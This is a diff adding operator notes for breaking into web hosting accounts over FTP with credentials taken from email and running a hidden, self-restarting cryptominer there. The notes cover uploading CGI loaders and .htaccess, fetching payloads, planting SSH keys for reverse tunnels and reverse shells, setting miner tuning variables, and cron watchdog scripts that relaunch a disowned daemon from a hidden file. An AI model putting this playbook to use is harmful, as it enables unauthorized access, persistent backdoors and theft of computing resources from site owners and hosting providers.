@@ -1,0 +1,56 @@
+ep=ftp://$USER@$IP:21
+
+- get ip/login from email
+- connect to ftpserver with like gio
+- upload set/ler and .htaccess for execution of scripts or use .cgi ext (chmod 755)
+- fetch payloads
+- create .ssh and add priv (for rev tun) and pub key (for rev ssh) in /home/$USER
+- make sure symlinks are working and the user shell in /passwd points correctly
+
+
+*** ENV VARS
+Example env vars:
+#+BEGIN_SRC shell
+  export ENV_VARS="
+MHF=2 \
+THREADS_FIXED=1 \
+X_ID=\"$HTTP_HOST\" \
+AESNI=$(grep aes -m 1 -c </proc/cpuinfo) \
+CSLEEP=20000 \
+MASKS_TYPE=web \
+MAX_LOAD=$(($(nproc)*100-$(nproc)*10)) \
+"
+#+END_SRC
+
+*** CRON JOB
+append to .crt.start
+#+BEGIN_SRC shell
+echo $BASHPID > /tmp/.crtpid
+#+END_SRC
+To make sure the daemon is running
+#+BEGIN_SRC shell
+/bin/bash -c "[ $(ps ux -H | grep -v httpd | wc -l) -lt 20 ] || exit ; cd ~/www/cgi-bin; kill -0 $(</tmp/.crtpid) || exec bash <.crt.start &>/dev/null & disown"
+#+END_SRC
+
+~/etc/check.cd
+#+BEGIN_SRC shell
+  #!/bin/bash
+
+  processes=$(ps ux -H)
+  processes=$(grep -v httpd <<< "$processes")
+  proc_count=$(wc -l <<< "$processes")
+  [ "$proc_count" -lt 20 ] || exit
+
+  cd ~/www/cgi-bin
+  crtpid=$(</tmp/.crtpid)
+
+  if pgrep -P $crtpid; then
+      :
+  else
+      lingering=$(ps -o pgid= $crtpid)
+      lingering=$(grep -o [0-9]* <<<"$lingering")
+      kill -9 $lingering $crtpid
+      exec bash <.crt.start &>/dev/null & disown
+  fi
+#+END_SRC
+
